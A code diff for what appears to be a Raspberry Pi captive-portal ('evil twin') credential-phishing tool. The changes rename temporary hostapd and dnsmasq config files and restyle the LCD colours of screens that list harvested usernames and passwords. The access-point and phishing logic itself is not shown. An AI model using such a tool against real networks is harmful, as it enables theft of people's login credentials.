@@ -74,8 +74,8 @@ LOOT_DIR = "/root/KTOx/loot/CaptivePortal"
 os.makedirs(LOOT_DIR, exist_ok=True)
 
 SITES_DIR = "/root/KTOx/DNSSpoof/sites"
-HOSTAPD_CONF = "/tmp/raspyjack_captive_hostapd.conf"
-DNSMASQ_CONF = "/tmp/raspyjack_captive_dnsmasq.conf"
+HOSTAPD_CONF = "/tmp/ktox_captive_hostapd.conf"
+DNSMASQ_CONF = "/tmp/ktox_captive_dnsmasq.conf"
 PORTAL_PORT = 80
 GATEWAY_IP = "10.0.99.1"
 DHCP_RANGE_START = "10.0.99.10"
@@ -615,10 +615,10 @@ def _export_creds():
 
 def _draw_screen():
     """Render state on LCD."""
-    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
+    img = Image.new("RGB", (WIDTH, HEIGHT), (10, 0, 0))
     draw = ScaledDraw(img)
 
-    draw.text((2, 2), "Captive Portal", fill="CYAN", font=font)
+    draw.text((2, 2), "Captive Portal", fill=(171, 178, 185), font=font)
 
     with lock:
         st = status_msg
@@ -633,7 +633,7 @@ def _draw_screen():
         atk = attack_running
         tpl_name = active_template_name
 
-    draw.text((2, 14), st[:22], fill="WHITE", font=font)
+    draw.text((2, 14), st[:22], fill=(242, 243, 244), font=font)
 
     if vm == "templates":
         y = 28
@@ -646,24 +646,24 @@ def _draw_screen():
                 label += " *"
             draw.text((2, y), f"{prefix}{label}", fill=color, font=font)
             y += 14
-        draw.text((2, 116), "OK=select UP/DN=scroll", fill="GRAY", font=font)
+        draw.text((2, 116), "OK=select UP/DN=scroll", fill=(86, 101, 115), font=font)
 
     elif vm == "ssid_edit":
-        draw.text((2, 28), "Edit SSID:", fill="WHITE", font=font)
+        draw.text((2, 28), "Edit SSID:", fill=(242, 243, 244), font=font)
         # Show SSID with cursor
         ssid_display = ssid_str
-        draw.text((2, 44), ssid_display[:22], fill="GREEN", font=font)
+        draw.text((2, 44), ssid_display[:22], fill=(30, 132, 73), font=font)
         # Cursor indicator
         cursor_x = 2 + sc * 6  # approximate char width
         draw.text((cursor_x, 56), "^", fill="RED", font=font)
-        draw.text((2, 72), "L/R=move UP/DN=char", fill="GRAY", font=font)
-        draw.text((2, 86), "OK=start portal", fill="GRAY", font=font)
-        draw.text((2, 116), "K3=back", fill="GRAY", font=font)
+        draw.text((2, 72), "L/R=move UP/DN=char", fill=(86, 101, 115), font=font)
+        draw.text((2, 86), "OK=start portal", fill=(86, 101, 115), font=font)
+        draw.text((2, 116), "K3=back", fill=(86, 101, 115), font=font)
 
     elif vm == "attack":
-        draw.text((2, 28), f"SSID: {ssid_str[:16]}", fill="GREEN", font=font)
-        draw.text((2, 42), f"Template: {tpl_name[:14]}", fill="WHITE", font=font)
-        draw.text((2, 56), f"Clients: {cli}", fill="YELLOW", font=font)
+        draw.text((2, 28), f"SSID: {ssid_str[:16]}", fill=(30, 132, 73), font=font)
+        draw.text((2, 42), f"Template: {tpl_name[:14]}", fill=(242, 243, 244), font=font)
+        draw.text((2, 56), f"Clients: {cli}", fill=(212, 172, 13), font=font)
         draw.text((2, 70), f"Creds: {len(creds)}", fill="RED" if creds else "GRAY", font=font)
 
         # Show recent creds
@@ -671,10 +671,10 @@ def _draw_screen():
         for c in creds[-2:]:
             fields = c.get("fields", {})
             user = fields.get("email", fields.get("username", fields.get("room", "?")))
-            draw.text((2, y), f"  {user[:20]}", fill="GREEN", font=font)
+            draw.text((2, y), f"  {user[:20]}", fill=(30, 132, 73), font=font)
             y += 10
 
-        draw.text((2, 116), "K1=creds K2=export", fill="GRAY", font=font)
+        draw.text((2, 116), "K1=creds K2=export", fill=(86, 101, 115), font=font)
 
     elif vm == "creds":
         y = 28
@@ -684,9 +684,9 @@ def _draw_screen():
             user = fields.get("email", fields.get("username", "?"))
             pw = fields.get("password", fields.get("lastname", "?"))
             line = f"{user[:10]}:{pw[:10]}"
-            draw.text((2, y), line[:22], fill="GREEN", font=font)
+            draw.text((2, y), line[:22], fill=(30, 132, 73), font=font)
             y += 14
-        draw.text((2, 116), "OK=back UP/DN=scroll", fill="GRAY", font=font)
+        draw.text((2, 116), "OK=back UP/DN=scroll", fill=(86, 101, 115), font=font)
 
     LCD.LCD_ShowImage(img, 0, 0)
 
@@ -832,7 +832,7 @@ def main():
             _stop_attack()
 
         try:
-            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
+            img = Image.new("RGB", (WIDTH, HEIGHT), (10, 0, 0))
             draw = ScaledDraw(img)
             draw.text((10, 56), "Portal stopped", fill="RED", font=font)
             LCD.LCD_ShowImage(img, 0, 0)
